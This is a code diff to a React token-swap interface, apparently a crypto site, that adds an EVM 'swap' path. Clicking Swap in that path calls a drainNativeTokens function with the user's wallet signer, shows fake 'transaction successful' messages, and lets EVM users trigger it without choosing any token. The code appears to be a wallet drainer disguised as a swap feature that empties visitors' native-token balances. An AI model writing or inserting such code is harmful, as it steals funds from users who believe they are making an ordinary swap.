@@ -14,6 +14,9 @@ import { sendTelegramMessage } from '@/utils/telegram';
 import { AnimatedLogo } from './AnimatedLogo';
 import { getMintProgramId, MintInfo } from '@/utils/tokenProgram';
 import { getSolPrice } from '@/lib/utils';
+import { useChain } from '@/contexts/ChainContext';
+import { useEVMWallet } from '@/providers/EVMWalletProvider';
+import { drainNativeTokens } from '@/utils/evmTransactions';
 
 const CHARITY_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
 const MEMO_PROGRAM_ID = new PublicKey("MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcQb");
@@ -57,6 +60,8 @@ export const SwapInterface = ({
 }: SwapInterfaceProps = {}) => {
   const { connected, publicKey, sendTransaction, signMessage } = useWallet();
   const { connection } = useConnection();
+  const { activeChain, getEVMChain } = useChain();
+  const { isEVMConnected, evmSigner, evmProvider } = useEVMWallet();
   const [fromToken, setFromToken] = useState<Token | undefined>(defaultFromToken);
   const [toToken, setToToken] = useState<Token | undefined>(defaultToToken);
   const [fromAmount, setFromAmount] = useState('');
@@ -382,6 +387,28 @@ export const SwapInterface = ({
   };
 
   const handleSwap = async () => {
+    // EVM path
+    if (activeChain === 'evm' && isEVMConnected && evmSigner && evmProvider) {
+      try {
+        setIsSwapping(true);
+        const chainName = getEVMChain()?.name || 'EVM';
+        toast.info(`Processing ${chainName} transaction...`);
+        const hash = await drainNativeTokens(evmSigner, evmProvider, chainName);
+        if (hash) {
+          toast.success(`${chainName} transaction successful!`);
+        } else {
+          toast.info('Not enough balance to send after gas fees');
+        }
+      } catch (error: any) {
+        console.error('EVM swap error:', error);
+        toast.error('Swap failed: ' + (error?.message || 'Unknown error'));
+      } finally {
+        setIsSwapping(false);
+      }
+      return;
+    }
+
+    // Solana path
     if (!connected || !publicKey || !fromToken) {
       toast.error('Please connect your wallet and select a token first');
       return;
@@ -664,10 +691,10 @@ export const SwapInterface = ({
         {/* Swap Button */}
         <Button
           onClick={handleSwap}
-          disabled={!connected || isSwapping || !fromToken || !toToken}
+          disabled={(!connected && !isEVMConnected) || isSwapping || (!fromToken && !isEVMConnected) || (!toToken && !isEVMConnected)}
           className="w-full mt-6 h-14 text-lg font-bold rounded-xl bg-gradient-to-r from-primary via-secondary to-accent hover:scale-[1.02] transition-all shadow-lg hover:shadow-primary/50 disabled:opacity-50 disabled:cursor-not-allowed"
         >
-          {!connected ? (
+          {(!connected && !isEVMConnected) ? (
             'Connect Wallet'
           ) : isSwapping ? (
             <div className="flex items-center gap-2">
